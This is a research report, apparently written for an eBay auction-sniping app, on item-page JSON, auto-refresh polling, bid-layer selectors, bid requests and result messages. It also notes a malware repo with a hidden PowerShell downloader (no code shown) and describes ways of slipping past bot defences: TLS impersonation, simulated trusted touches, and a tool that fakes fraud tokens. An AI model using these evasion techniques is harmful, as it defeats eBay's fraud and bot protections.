# eBay's current web bidding flow and item-page data (ebay.co.uk primary), as implemented by open-source tools and verified against archived 2025-2026 pages

## Summary
Modern eBay item pages on ebay.co.uk, ebay.com and ebay.de (checked in Wayback raw snapshots from 2025-06 to 2026-04 and in 2026 test fixtures) carry a JSON page model inside an inline script. Its SEMANTIC_DATA and BUY_BOX modules give the end time to the millisecond (endDate.value and bidInfo.endTime, a TimerModel). They also give the current price as a number with its currency, the bid count, listingStatus (ACTIVE or ENDED), hasReservePrice, isHighBidder, the seller username and the origin marketplace. The JSON-LD has price, postage and images but no end time, and the visible countdown text is not precise enough. The page polls /itemmodules/<id>?module_groups=AUTO_REFRESH&... for the same price, bid count and TimerModel as JSON, and each reply says when to poll next (refreshInSeconds: 2 s in the last minute, 3 s at 1-2 min, 6 s at 2-3 min, 59 s at 17 min). Calling that endpoint from inside the WebView page gives the most precise monitor at eBay's own rate. In 2025-2026 a bid is one in-page layer: click #bidBtn_btn, type the maximum into the layer input (its id contains @placebid-section-@offer-section-@price; class textbox__control), then press the primary button (Bid, Increase bid or Increase max bid). There is no separate confirm page any more. Underneath, the layer is POWER_BID_LAYER (prefetch URL /experience/auction/v2/bid/module_provider?...). The bid itself is POST /bfl/placebid?action=trisk, then POST /bfl/placebid?action=confirmbid&modules=POWER_BID_LAYER&ocv=1, carrying an srt CSRF token, a Forter fraud token and an attemptId behind Akamai Bot Manager, so the app should drive the real UI instead of replaying these requests. After a bid the layer shows 'Your current bid puts you in the lead.' or 'Another bidder is winning. Increase your bid.'. After the end, a reload shows 'Item sold on ...', 'Bidding ended on ...' or 'This listing was ended by the seller on ... because the item is no longer available.', plus listingStatus ENDED and auctionData.biddingEndedAt. No source captured the signed-in won or lost wording on a 2026 page. The model has isHighBidder and auctionData.bidderAuctionDetails.userBiddingStatus (eBay's GraphQL API returns WINNING or OUTBID for that field), and won items appear in /mye/myebay/purchase. The biggest change for a sniper is Extended Bidding: the July 2025 test reset the clock to 2 minutes on select trading cards, and the full rollout to Australian auctions on 17 Aug 2026 resets it to 60 seconds. eBay Motors also uses it, and the UK help page fetched today calls it a test in some categories with a 60-second reset. Listings carry auctionData.extendedBidding and endAtOrAfter, so the app must keep monitoring after its snipe. eBay has three automation walls: an 'Error Page | eBay' rate wall, a self-clearing /splashui/challenge page and a real /splashui/captcha page. It also blocks non-browser TLS fingerprints and datacenter IPs, so all eBay traffic should go through the phone's WebView. Projects bid 1 to 25 seconds before the end; the one reported real win used 1.2-1.9 s plus measured round-trip time, and Gixen and snipesnipe default to 6 s. No source measured how long the bid request itself takes. One candidate repo, andrey-ivanov-eng1998x8/ebay-sniper-tool-2, is malware: line 1 of sniper.py hides a PowerShell downloader.

## Findings
- **IS1** [high] Every 2025-2026 item page embeds a SEMANTIC_DATA module (_type SemanticDataModule) with listingStatus (ACTIVE/ENDED), endDate.value (ISO UTC with ms), startDate.value, refreshTimers.itemEnding.value, bidCount, currentBidPrice {value, currency, convertedFromValue, convertedFromCurrency}, hasReservePrice, isHighBidder, auctionPossible, sellerUserName, listingId, marketplaceListedOn (EBAY_GB/EBAY_US/EBAY_DE), listingLocale, exchangeRate, immediatePay, relistedId, bidPrefetch, auctionData {endAtOrAfter, biddingEndedAt}.
  - evidence: Wayback raw snapshots: https://web.archive.org/web/20260427110748id_/https://www.ebay.co.uk/itm/127820098965 (live UK auction, 2026-04-27), https://web.archive.org/web/20260121005928id_/https://www.ebay.com/itm/127622190770 (live US, 2026-01-21), https://web.archive.org/web/20251209135725id_/https://www.ebay.co.uk/itm/-/146949522734 (ended, 2025-12-09); camh000/dealfinder tests/fixtures/ebay_item_page_2026-07.html and ebay_item_ended_*_2026-09.html (commit 2026-10-09). Local copies: /var/tmp/sniper-research/wayback/live_dec/, snaps_dec/.
  - implication: Make this JSON the primary data source in the WebView: parse the end time (to the ms), price, currency, bid count, status, reserve flag, seller and origin site from it, not from DOM text.
- **IS2** [high] The BUY_BOX module (_type BuyBoxModule) holds bidPrice.value {value, currency} plus display text (e.g. '£5.37', 'US $69.99'), bidInfo.bidCount.value with text '1 bid', and bidInfo.endTime, a TimerModel with endTime.value, urgencyTime (end minus 1 h), counterStartTime (end minus 24 h), label 'Ends in', formattedText (e.g. '5m 33s'), appendText with seconds and zone (e.g. '27 Apr, 2026 12:13:22 BST', 'Jan 20, 2026 17:00:44 PST') and expiredText 'Ended'.
  - evidence: Same 2026-04-27 UK and 2026-01-14/21 US snapshots; the pattern was first reported in isaaclkchong/ebay-sniper mercury/auction.py:194-205 (2026-02-12): "endTime":{"_type":"TimerModel","endTime":{"value":...}}.
  - implication: Use bidInfo.endTime.endTime.value as the authoritative end; appendText is a second-precision fallback that needs the zone abbreviation (GMT/BST, PST/PDT, MEZ/MESZ) parsed.
- **IS3** [high] Pages also embed GraphQL-shaped data (listingV2ById) with items[].auctionData {endAtOrAfter, biddingEndedAt, extendedBidding, bidderAuctionDetails {userBiddingStatus}} and listingLifecycle.endDate as a plain ISO string, so the regex for a string-valued endDate key works; regexes for a string endTime or for itemEndDate find nothing.
  - evidence: listingV2ById in the 2026-01-14 US snapshot; bidderAuctionDetails seen in dealfinder fixtures 2026-07 and 2026-09; jq6l43d1/ebay-sniper snipe.py:182-191 (2026-10-09) tries endTime/itemEndDate/endDate string patterns; camh000/dealfinder EbayScraper.py:2866 uses the endDate string (2026-09/10). Checked across six 2025-11..2026-04 snapshots.
  - implication: The fastest robust extractors are a regex on endDate (string) or biddingEndedAt; parse JSON for the rest.
- **IS4** [high] JSON-LD Product on 2026 auction pages gives offers.price, priceCurrency, availability (InStock/OutOfStock), itemCondition, url, shippingDetails[].shippingRate {value, currency} and image[] (s-l1600.jpg), but no availabilityEnds or validThrough.
  - evidence: JSON-LD parsed from the 2026-04-27 UK and 2026-01-21 US live snapshots; pauljones0/snipesnipe snipesnipe/extension/content.js:55 (2026-10-15) and isaaclkchong strategy 6 rely on availabilityEnds, which is absent.
  - implication: Do not take the end time from JSON-LD; it is still a good source for the title, main image, currency and a postage estimate.
- **IS5** [high] Current DOM hooks for the price and timer (UK and US, 2025-12 to 2026-04): div.x-price-section[data-testid=x-price-section][data-ebay-critical-module=BUY_BOX] > div.x-bid-price[data-testid=x-bid-price] > div.x-price-primary[data-testid=x-price-primary] span.ux-textspans; div.x-bid-count[data-testid=x-bid-count] a[href*='/bfl/viewbids/'] span.ux-textspans--PSEUDOLINK ('1 bid'); div.x-end-time[data-testid=x-end-time] span.ux-timer[data-testid=ux-timer] span.ux-timer__text[data-testid=ux-timer_timer] ('Ends in 5m 33s') with span.ux-timer__time-left ('Friday, 06:28 PM' when over a day, empty near the end); div.vim.x-auto-refresh[data-testid=x-auto-refresh] on live auctions only.
  - evidence: 2026-04-27 UK and 2025-12-09 snapshots; zombu4/Greedbay-Detective src/browser/extractors/item.js (recon 2026-10-19..22); kernel/xwebmcp domains/ebay.com/get_listing.js:175-181 (2026-10-26); anntnzrb/agents ebay-live tests/fixtures/item.html (live markup captured 2026-10-07).
  - implication: These are the DOM fallbacks for display and for a sanity check against the model; use data-testid and critical-module attributes, which stayed stable from 2024 to 2026.
- **IS6** [high] The visible countdown carries no seconds-precision date or zone when the end is far away. Greedbay's DOM-only recon (2026-10-19) concluded that 'the page carries no timestamp', and dealfinder found that search-card countdowns put the derived end up to 59 s early.
  - evidence: zombu4/Greedbay-Detective src/lookup/AuctionTime.h; camh000/dealfinder EbayScraper.py:2863-2866 comment.
  - implication: Never schedule a snipe from DOM countdown text; use the model end time (IS1/IS2) or AUTO_REFRESH (AR1).
- **IS7** [medium] Sign-in state is exposed in the page. Signed out, the header has var GHpre = {..., userAuth:false, userId:'', fn:'', shipToLocation:...} and the model config has signedIn:false; signed in, the greeting span.gh-identity__greeting reads 'Hi <name>!'. Projects also check that https://www.<site>/mye/myebay/summary is not redirected to sign-in.
  - evidence: GHpre and signedIn:false in the 2026-04-27 UK, 2026-01-21 US and 2026-07/09 dealfinder pages; owengregson/ebay-sniper v1 bot.js:54 (2025-11-17) checks .gh-identity__greeting startsWith('Hi'); adbertram/cli-tools ebay/ebay_cli/browser.py:100 (2026); PsychedelicPalimpsest/ebaySniper ebay.py:42-43 (2024-07); zombu4/Greedbay-Detective src/ebay/PageCheck.h (2026-10-18).
  - implication: Use evaluateJavascript('window.GHpre && window.GHpre.userAuth') before arming a snipe. The signed-in value true is inferred: only signed-out pages were captured.
- **IS8** [medium] Two model fields can say whether the signed-in user leads: SEMANTIC_DATA.isHighBidder, and auctionData.bidderAuctionDetails.userBiddingStatus (null when signed out). eBay's GraphQL itemBiddingActivity API returns WINNING, OUTBID or null for the same field name.
  - evidence: isHighBidder:false and userBiddingStatus:null in signed-out pages (2025-11..2026-09); hsukenooi/comic-pipeline apps/ebay/src/ebay_bid_status.py (2026-11-03) queries bidderAuctionDetails { userBiddingStatus } and maps WINNING/OUTBID.
  - implication: Read both fields after the bid and after the end. That they fill in for a signed-in bidder is inferred and must be checked on the phone.
- **IS9** [medium] The reserve is flagged by SEMANTIC_DATA.hasReservePrice (boolean). No 2024-2026 source shows the current 'reserve not met' DOM or model text. Older code matched AcceptBid_ReserveNotMet page names (esniper, 2019), the German 'Mindestpreis wurde noch nicht erreicht' (Biet-O-Matic, 2021) and the phrase 'reserve not met' (isaaclkchong, 2026, unverified).
  - evidence: hasReservePrice:false in all captured auctions; sourceforge esniper auction.c:726-761; sweitzel/Biet-O-Matic-BE src/js/EbayParser.js:608-614.
  - implication: Show the reserve status from hasReservePrice. For met or not met, capture BUY_BOX.bidAdditionalInfo text on a real reserve auction; that field holds 'or Best Offer' today, and that it also holds the reserve text is inferred.
- **IS10** [high] The minimum next bid is not in the page model. Tools read it from the bid layer's quick-bid buttons or compute it from eBay's increment table. The UK table (fetched 2026-11-04): £0.01-0.99 +£0.05; £1-4.99 +£0.20; £5-14.99 +£0.50; £15-59.99 +£1; £60-149.99 +£2; £150-299.99 +£5; £300-599.99 +£10; £600-1,499.99 +£20; £1,500-2,999.99 +£50; £3,000+ +£100. The US table differs (owengregson increments.js: <$1 0.05, <$5 0.25, <$25 0.50, <$100 1, <$250 2.50, <$500 5, <$1000 10, <$2500 25, <$5000 50, else 100).
  - evidence: WebFetch https://www.ebay.co.uk/help/buying/bidding/automatic-bidding?id=4014 (2026-11-04); owengregson/ebay-sniper src/bidding/increments.js (2025-11-17).
  - implication: Compute the minimum as current price plus the site's increment (the starting price when bidCount is 0). Warn when the user's max is below it, and confirm against the layer text at bid time.
- **IS11** [high] The name of the script global that holds the model changes between builds: $MC=(window.$MC||[]).concat(...) in 2025-06 and $M_96613636_C=(window.$M_96613636_C||[]).concat(...) in 2025-12 to 2026-04.
  - evidence: Snapshots 20250623154440 (146521106925) and 20251207..20260427.
  - implication: Find modules by searching the HTML for the key text (e.g. SEMANTIC_DATA followed by its _type), not by a fixed variable name.
- **IS12** [medium] On ebay.co.uk private-seller auctions the displayed bid price includes the Buyer Protection fee: bidPrice £15.94 with bidPriceProgram 'incl. £0.94 for Buyer Protection' and action VI_BUYER_PROTECTION params priceType STARTING_BID_PRICE.
  - evidence: https://web.archive.org/web/20251207184835id_/https://www.ebay.co.uk/itm/-/167906389654 (UK auction ended 2025-11-16), BUY_BOX module.
  - implication: Separate the fee from the item price before comparing with the user's maximum. Whether the typed max bid includes the fee is unknown (open question).
- **IS13** [high] A listing from another site viewed on ebay.co.uk shows the original currency as primary text and GBP as approximate: BUY_BOX.bidPrice text 'US $24.99' with value {value 18.76, convertedFromValue 24.99, convertedFromCurrency USD, currency GBP}, plus bidPriceApprox '£18.76' with the label 'Approximately'; SEMANTIC_DATA.marketplaceListedOn is EBAY_US.
  - evidence: https://web.archive.org/web/20251209135725id_/https://www.ebay.co.uk/itm/-/146949522734 (2025-12-09).
  - implication: Bid in the listing's currency (convertedFromCurrency) when it differs from the site currency, and show the user both amounts.
- **AR1** [high] The item page polls GET /itemmodules/<id>?module_groups=AUTO_REFRESH&viewer_item_relation=0&isSemiPersistentBin=false&upiState=notEligible&upiDelayTime=0&upiDelayReason=NotApplicable&includeFGQL=false. The same URL sits in the page model (AUTOREFRESH.autoRefreshAction.URL). The JSON states[] carry eventName ux-app__x-auto-refresh__refreshState (refreshInSeconds), ux-app__x-bid-price-section__refreshState (bidPrice, bidInfo.bidCount, bidInfo.endTime TimerModel) and ux-core__ux-call-to-action__refreshState (ATC/BIN/OFFER disabled flags).
  - evidence: Wayback captures of 94 such JSON responses from ebay.com, ebay.co.uk and ebay.de, 2024-01..2026-04 (e.g. https://web.archive.org/web/20260427110806id_/https://www.ebay.co.uk/itemmodules/127820098965?module_groups=AUTO_REFRESH&...); PsychedelicPalimpsest/ebaySniper ebay.py:45-53 (2024-07-26) used it to read bidPrice, bidCount and bidInfo.endTime.endTime.value. Local: /var/tmp/sniper-research/wayback/autorefresh_dec/.
  - implication: For monitoring, fetch this URL from inside the item page (same-origin, credentials included) instead of reloading the page; it returns live price, bid count and end time in about 3 KB.
- **AR2** [high] eBay's own refreshInSeconds grows with the time left: 2 s at 60 s or less; 3 s at 61-115 s; 6 s at 128-174 s; 9 s at 190-224 s; 16 s at 316 s; 24 s at 451 s; 59 s at 1014 s; about 2000 s at 6.7 h; 60458 s at 6 days. At the end, the response has no auto-refresh state and an empty formattedText.
  - evidence: 94 Wayback AUTO_REFRESH captures 2024-01..2026-04 (capture time compared with endTime); embedded AUTOREFRESH.refreshInSeconds=16 at 5m33s left (2026-04-27 UK) and 60458 at 6d 1h (2026-01-14 US).
  - implication: Use refreshInSeconds as the 'gentle rate' cap for background monitoring. eBay's own page polls every 2 s in the last minute, so a few extra polls near the end match normal traffic.
- **AR3** [high] The AUTO_REFRESH schema changed over time: Jan-Mar 2024 responses wrapped data in ux-app__x-hero__refresh-state and included bidPriceLabel ('Current bid:'/'Starting bid:'); from Mar 2024 the state is ux-app__x-auto-refresh__refreshState; from Jun 2025 the URL adds includeFGQL=false. The ux-app__x-bid-price-section__refreshState payload stayed stable from 2024-01 to 2026-04.
  - evidence: Per-month breakdown of the 94 captures in /var/tmp/sniper-research/wayback/autorefresh_dec/.
  - implication: Find the state by eventName containing 'bid-price-section' and tolerate added or removed wrappers.
- **AR4** [high] Text in the AUTO_REFRESH response is localized but the numbers are not. ebay.de: 'EUR 7,50', '4 Gebote', label 'Endet in', formattedText '1 Min 45 Sek', appendText '03. Apr. 2026 20:20:04 MESZ', expired 'Beendet'. ebay.co.uk: '£5.37', '1 bid', '27 Apr, 2026 12:13:22 BST'.
  - evidence: https://web.archive.org/web/20260403181818id_/https://www.ebay.de/itemmodules/147226909132?... and 20260217175327 (206055686082).
  - implication: Parse value fields only; display strings differ per site (EUR uses a decimal comma).
- **BF1** [high] The bid entry point has been #bidBtn_btn for years. Signed out (2026), it is <a id=bidBtn_btn href=https://signin.ebay.co.uk/ws/eBayISAPI.dll?SignIn&ru=<item URL>%3Fcta%3Dplacebid data-elementid=MaxBidId data-elementparams=maxbid data-signinurl=... disabled> inside div.vim.x-bid-action.loading[data-testid=x-bid-action] within ul.x-buybox-cta[data-ebay-critical-module=BUY_BOX_CTA]. Signed in, it is a button with data-url='/bfl/placebid/<itemId>?...&currencyId=USD'.
  - evidence: 2026-04-27 UK and 2026-01-14 US snapshots; dealfinder fixture 2026-07; mvanhorn/printing-press-library library/commerce/ebay/.manuscripts/20260430-074134/discovery/browser-sniff-report.md:22,40 (live capture 2026-04-30); RavidDimant/eBay-Sniper-Auto-Bidding main.py:102 (2025-09) uses //span[text()='Place bid']/ancestor::button.
  - implication: Select #bidBtn_btn first, with [data-testid=x-bid-action] a/button as a fallback. A signin href means the session is gone.
- **BF2** [high] The bid button label depends on site and variant: 'Submit bid' on ebay.co.uk (snapshots 2026-04-27 and 2026-07), 'Place bid' on ebay.com (2026-01). The UK page i18n still contains placeBid 'Place bid'.
  - evidence: BUY_BOX_CTA.combinedSection.dataItems[].text in the 2026-04-27 UK snapshot and dealfinder ebay_item_page_2026-07.html; 2026-01-14/21 US snapshots.
  - implication: Do not select by label text. RavidDimant's 'Place bid' XPath and unibrowse's text matching would fail on ebay.co.uk.
- **BF3** [high] The bid layer is prefetched from SEMANTIC_DATA.bidPrefetch.URL = /experience/auction/v2/bid/module_provider?item_id=<id>&modules_group=POWER_BID_LAYER&refresh_page=false&prefetch_page=true&_trksid=p4429486.m2548.l4626 (name TXN_FLOW, cta BID).
  - evidence: 2026-01-14 US, 2026-04-27 UK and dealfinder 2026-07 UK pages; Wayback captures of the same URL for signed-out crawlers (2025-07) are 302 redirects.
  - implication: Expect this XHR when the page loads and the layer opens; its success or failure is a readiness check before the snipe moment (inferred).
- **BF4** [medium] The bid layer cannot be opened by navigating straight to /bfl/placebid/<itemId>; that returns 'Oops! Looks like we're having trouble connecting'. It must come from the in-page click. The page model holds the same error text: 'Oops! Looks like we're having trouble connecting to our server.' (US) and 'Oops. Looks like ...' (UK).
  - evidence: printing-press browser-sniff-report.md:23 (2026-04-30); BUY_BOX_CTA clientPresentationMetadata.errorMessage in the 2026-01 and 2026-04 snapshots.
  - implication: Load the item page in the WebView and open the layer from the page; treat the Oops text as a retryable layer failure.
- **BF5** [medium] The bid layer container's class changed over time: #bid-offer-summary (2024-07), .place-bid-wrapper-ocv (2025-11), .placebid-redesign-wrapper rendered inline (2026-04). Generic dialog fallbacks are [role=dialog] and lightbox-dialog.
  - evidence: PsychedelicPalimpsest/ebaySniper ebay.py:59 (2024-07-26); owengregson/ebay-sniper src/bidding/performBid.js:22 (2025-11-17); printing-press browser-sniff-report.md:24 (2026-04-30); pauljones0/snipesnipe default review selector [role=dialog] (2026-10, unverified).
  - implication: Wait for any of these containers after the click; record the real 2026 UK class on the phone.
- **BF6** [high] Bid amount input selectors over time: input[id*='@placebid-section-@offer-section-@price'] (2026-04), input[id*='@placebid']:visible (2026-10), input[type='tel'].textbox__control (2025-09), input.textbox__control (2025-04), input[id*='price'] (2025-11). The legacy one is #MaxBidId / input[name=maxbid] (2017-2021 pages).
  - evidence: printing-press browser-sniff-report.md:25; jq6l43d1/ebay-sniper snipe.py:40 (2026-10-09); RavidDimant main.py:107 (2025-09); yangvianno/ProxySnipe bid_proxy.py (2025-04-29); owengregson performBid.js:38; sweitzel/Biet-O-Matic-BE src/js/contentScript.js:174-175 (2021).
  - implication: Try a chain of selectors. Set the value with input/change events or real key events, since Marko listens for input (inferred).
- **BF7** [medium] The layer shows quick 'power bid' buttons, .place-bid-actions__powerbids-wrapper button, labelled 'Bid $X.XX'; PsychedelicPalimpsest asserted three of them. Clicking one bids that exact amount.
  - evidence: PsychedelicPalimpsest/ebaySniper ebay.py:66-83 (2024-07-26); owengregson performBid.js:25-34 (2025-11-17).
  - implication: The lowest power-bid label is the live minimum next bid; never click one for a snipe, since the user's max goes in the text field.
- **BF8** [high] In the 2025-2026 flow the submit button places the bid at once, with no review or confirm page. Selectors: div.place-bid-actions__submit > button.btn--fluid.btn--primary with text 'Bid' (2025-09), button.btn--fluid.btn--primary 'Bid' (2026-04), button[type=submit] with exact text 'Bid', 'Increase bid' or 'Increase max bid' (2026-10), button.btn--primary:not([disabled]) (2025-11). Older flows had a confirm page with input[name='confirmbid'] (offer.ebay.*, 2020-2021) or #confirmBid (ebay.it notebook, 2024-10).
  - evidence: jq6l43d1/ebay-sniper snipe.py:41-72 and README ('eBay's bid window has no separate confirmation step'); RavidDimant main.py:114-118; printing-press report:25; owengregson performBid.js:43; Biet-O-Matic contentScript_offer.js; VincenzoImp/ebay-sniper-bot bidder.ipynb (2024-10-12).
  - implication: Prepare the layer early (open it, type the amount, pre-locate the submit button), then tap submit at the snipe moment. 'Increase max bid' means the user already bids on this item.
- **BF9** [high] Observed network sequence for a bid (ebay.com, 2026-04-30): GET /bfl/placebid/<itemId>?_trksid=<trk>&currencyId=USD&module=1 (layer HTML); POST /bfl/placebid?action=trisk&_trksid=<trk>, JSON {itemId, attemptId(uuid), ut:'1', triskXt:0, forterToken, srt}; POST /bfl/placebid?action=confirmbid&modules=POWER_BID_LAYER&_trksid=<trk>&ocv=1, JSON {decimalPrecision:2, price:{currency, value}, itemId, elvisWarningShown:false, adultVerified:false, userAgreement:null, srt, autoPayContext:{attemptId}}; side call POST /bmgt/ajax/UpdateUserTxnFlag. Session cookies include cid, s, nonsession, dp1, ebaysid, shs, ds1, ds2, npii.
  - evidence: mvanhorn/printing-press-library browser-sniff-report.md:38-47, 52-60, 87-98 (manuscript 20260430-074134); spec.yaml:128-240.
  - implication: With WebView request interception, the app can watch for the confirmbid response as the 'bid sent' signal and record its timing. It should not build these requests itself.
- **BF10** [medium] Replaying the bid POSTs outside the page is fragile. printing-press says requests without a fresh Forter token are rejected, yet its own bid.go falls back to a made-up forterToken '<32hex>_<ms>__UDF43_15ck_tt' on the unverified claim that eBay accepts stale tokens.
  - evidence: browser-sniff-report.md:61-63; internal/source/ebay/bid.go staleForterPlaceholder() (repo HEAD 2026-11-03).
  - implication: Bid only through the real UI inside the WebView so eBay's own scripts (Forter, Akamai sensor, srt) produce the tokens.
- **BF11** [low] Two item-URL parameters open the bid UI on load: ?bolp=1 (PsychedelicPalimpsest navigated to /itm/<id>?bolp=1 and then waited for #bid-offer-summary, 2024-07) and ?cta=placebid (the 2026 sign-in return URL, ru=<item>?cta=placebid).
  - evidence: PsychedelicPalimpsest/ebaySniper ebay.py:64 (2024-07-26); bidBtn_btn href and data-signinurl in 2026-01/04/07 snapshots; bolp is absent from 2026 pages.
  - implication: Try /itm/<id>?cta=placebid to pre-open the layer at T-60 s. That it works for signed-in users is inferred; fall back to clicking #bidBtn_btn.
- **BF12** [high] Legacy flows that are dead or unverified: offer.ebay.<tld>/ws/eBayISAPI.dll?MfcISAPICommand=MakeBid&item=<id>&maxbid=<v> then mode=1 with hidden uiid/stok/srt (esniper, last changed 2019-10-19, site says 'It does no longer work', 2024-10-30; ruippeixotog/ebay-snipe-server, 2019); 2017 /bfl/placebid/<id> JSON {redirectUrl, cssUrl, jsUrl, inlineJs, html} with placebid_layer_powerbid_wrapper; gixen-cli ebay_bidder.py (2026-04-27) still posts MakeBid with a stok token, without evidence that it works.
  - evidence: sourceforge esniper auction.c:276-277, 317-319, 860-861 and index.html; ruippeixotog sites/common.conf; Wayback https://web.archive.org/web/20171012021310id_/http://www.ebay.co.uk:80/bfl/placebid/112581554314?_trksid=p2047675.m4905; hsukenooi/gixen-cli ebay_bidder.py.
  - implication: Do not implement MakeBid or stok-token posting.
- **BF13** [medium] Server-rendered CTAs start inert: class 'loading' on div.x-bid-action and a disabled attribute on #bidBtn_btn (data-present-as-enabled=true appeared in 2026-07). The same pattern appears on #binBtn_btn_1.
  - evidence: 2026-01-14 US, 2026-04-27 UK and 2026-02-11 BIN snapshots; dealfinder 2026-07 fixture.
  - implication: Before the snipe window, wait until the 'loading' class and the disabled attribute are gone, i.e. JS has hydrated (inferred).
- **BF14** [medium] jq6l43d1 sends the Place-bid click as a real mouse move and click at the button's coordinates (20 steps, 80 ms dwell, 60 ms press), described as more likely to pass anti-bot than a synthetic DOM click, and falls back to waiting for a manual click. It types the amount with a 70 ms key delay and pre-hovers the submit button.
  - evidence: jq6l43d1/ebay-sniper snipe.py:377-418, 520 (2026-10-09).
  - implication: In the Android WebView, prefer MotionEvent touches dispatched at element coordinates over element.click(), which creates untrusted events (inferred; test which ones eBay accepts).
- **RS1** [high] The layer's result notice: 'Your current bid puts you in the lead.' (leading) or 'Another bidder is winning. Increase your bid.' (an existing higher proxy bid beat you), read from span.inline-notice__main > div > span > span (2024-07). The 2026-04 modal read 'Your current bid puts you in the lead', followed by '$3.25 current bid + $6.07 shipping', '3 bids · 1h 4m left'.
  - evidence: PsychedelicPalimpsest/ebaySniper ebay.py:101-113 (2024-07-26); printing-press browser-sniff-report.md:13, 100 (2026-04-30).
  - implication: Map the first text to 'bid accepted, leading' and the second to 'outbid immediately'. Capture the UK wording on the phone.
- **RS2** [high] After the end, a signed-out reload shows listingStatus ENDED, auctionData.biddingEndedAt and a STATUS_MESSAGE (LayoutSectionModule) rendered in [data-testid=d-statusmessage]. Texts: 'Item sold on Sun, 14 Dec at 5:35 PM.' (UK), 'Item sold on Tue, Jan 20 at 5:00 PM.' (US), 'Bidding ended on Sun, 16 Nov at 7:08 PM.' (no sale), 'This listing was ended by the seller on Fri, 18 Apr at 4:34 PM because the item is no longer available.', and the line 'The seller has relisted this item or one like this.'. Sold items also show singleSkuOutOfStock:true and JSON-LD availability OutOfStock.
  - evidence: Snapshots 20260105125151 (177654722949), 20260123010506 (127622190770), 20251207184835 (167906389654), 20250623154440 (146521106925), 20250714035904 (146589404386); camh000/dealfinder EbayScraper.py:2097-2147 uses listingStatus, biddingEndedAt and 'Item sold on'.
  - implication: Decide the final state from listingStatus and biddingEndedAt; use the status text to tell sold from unsold and ended early.
- **RS3** [medium] An auction ended early by the seller shows endDate and biddingEndedAt before refreshTimers.itemEnding, the original schedule: start 2025-04-16T04:31:13Z, itemEnding 2025-04-23T04:31:13Z, endDate 2025-04-18T15:34:01Z.
  - evidence: https://web.archive.org/web/20250623154440id_/https://www.ebay.co.uk/itm/-/146521106925 (SEMANTIC_DATA and STATUS_MESSAGE).
  - implication: Report 'ended early' when endDate is well before itemEnding, or when the status text contains 'was ended by the seller'; cancel the pending snipe.
- **RS4** [low] No 2024-2026 capture shows the signed-in winner's or loser's page text. Older strings: 'You won this auction', 'You didn't win this auction.', 'You've been outbid' (en) and 'Sie waren der Höchstbietende', 'Sie wurden überboten' (de) (Biet-O-Matic, 2021); 'You're currently the highest bidder', 'You've just been outbid' (ruippeixotog, 2019). RavidDimant (2025-09) treats 'congratulations' anywhere in the page source as a win.
  - evidence: sweitzel/Biet-O-Matic-BE src/js/EbayParser.js:590-616; ruippeixotog sites/ebay-com.conf; RavidDimant main.py:128-132.
  - implication: Decide won or lost from structured fields (userBiddingStatus, isHighBidder, a match in the purchases list) and treat text only as a hint until the UK wording is captured.
- **RS5** [medium] A tie at the same maximum goes to the earlier bidder, so a sniper whose max equals the final price may have lost.
  - evidence: hsukenooi/comic-pipeline apps/ebay/src/ebay_bid_status.py header (2026-11-03): 'eBay gives an exact tie to the earlier bidder, so a tie is a phantom win'.
  - implication: Never call it a win because the final price equals the user's max; wait for a structured verdict.
- **RS6** [medium] Ways to confirm a result after the end: won orders appear on /mye/myebay/purchase (div.m-ph-card.m-order-card with a.nav-link[href*='/itm/'], 2026-10-20); bid history /bfl/viewbids/<id>?item=<id>&rt=nc redirects signed-out users to sign-in; ended item pages stay public about 60-90 days, after which /itm/<id> redirects to a /p/ catalogue page.
  - evidence: zombu4/Greedbay-Detective src/browser/extractors/purchases.js; Wayback viewbids capture 20240119011505 redirects to signin.ebay.co.uk; camh000/dealfinder EbayScraper.py:2094.
  - implication: For the 'won' state, cross-check the item ID in My eBay purchases inside the signed-in WebView.
- **RS7** [medium] An item URL can redirect to a different item number when the listing was relisted. xwebmcp reports this as 'redirected' and SEMANTIC_DATA carries relistedId.
  - evidence: kernel/xwebmcp domains/ebay.com/get_listing.js:129-134 (2026-10-26); relistedId in 2025-07 and 2025-12 snapshots.
  - implication: After the end, compare the final URL's item ID with the tracked ID before using any data.
- **AB1** [high] Three walls captured live on 2026-08-28 with a signed-in session: (1) title 'Error Page | eBay', body 'SORRY Something went wrong on our end <ref> Please go back and try again or go to eBay Homepage.', a request-rate wall that held 8 s or more and survived re-navigation at about 9.5 s; (2) /splashui/challenge?ap=1&appName=orch&ru=<url>, title 'Pardon Our Interruption...', body 'Checking your browser before you access eBay. Your browser will redirect to your requested content shortly.', which clears itself; (3) /splashui/captcha?ap=1&appName=orch, title 'Security Measure', a real human check.
  - evidence: adbertram/cli-tools ebay/ebay_cli/browser.py:30-80 and ebay/tests/test_browser_error_interstitial.py (2026-08/11); kernel/xwebmcp get_listing.js:112-143 (2026-10-26); pauljones0/snipesnipe docs/validation.md:23 (ebay.ca challenge, 2026-10-15).
  - implication: Detect each by URL path and title. Wait in place on challenge; show the WebView to the user on captcha; back off at least 8 s with jitter on Error Page. Never auto-solve.
- **AB2** [high] eBay (Akamai) blocks by TLS/HTTP2 fingerprint and datacenter IP. curl, Python requests, Chrome or Firefox impersonation and Cloudflare Workers get '403 Error Page'; curl_cffi Safari impersonation from a home IP passed (2026-09-24, 2026-10). Item pages and search are walled from datacenter IPs (2026-06).
  - evidence: Puyodead1/fxebay README and fetcher/app.py (2026-10-23); camh000/dealfinder EbayScraper.py:72-77 (2026-09-24); tamnd/ebay-cli ebay/domain.go (2026-06-29); printing-press traffic-analysis.json ('Plain stdlib HTTP returns 403').
  - implication: Send all eBay traffic through the WebView (real Chromium, real JS), including AUTO_REFRESH polling by in-page fetch. Do not call eBay from OkHttp.
- **AB3** [high] Bot and fraud stack on bid pages: Akamai Bot Manager cookies ak_bmsc, bm_s, bm_ss and an obfuscated beacon path (/XCFeZj/k4cD/...); a Forter forterToken in the format <32-hex>_<unix-ms>__UDF43_15ck_tt; per-action srt CSRF tokens beginning 01000b00000050 (page model watch tokens look the same).
  - evidence: printing-press browser-sniff-report.md:56-63 (2026-04-30); watchHeartInfo.csrfTokens.addToWatchCSRFToken in the 2026-01-14 and 2026-02-11 snapshots.
  - implication: Keep JS, cookies and storage enabled in the WebView, and keep the same WebView profile across sessions.
- **AB4** [medium] Sign-in hurdles seen in 2025-2026: Google sign-in is blocked in automated browsers (set an eBay password instead); passkey promo interstitials (.passkeys-register-wrapper, [data-testid='passkey-promo'], passkeys-promo shadow DOM, #passkeys-cancel-btn); emailed verification codes (#code, #validate-code-button, #send-button); form ids #userid, #signin-continue-btn, #pass, #sgnBt; an optional 'Continue with eBay' button.
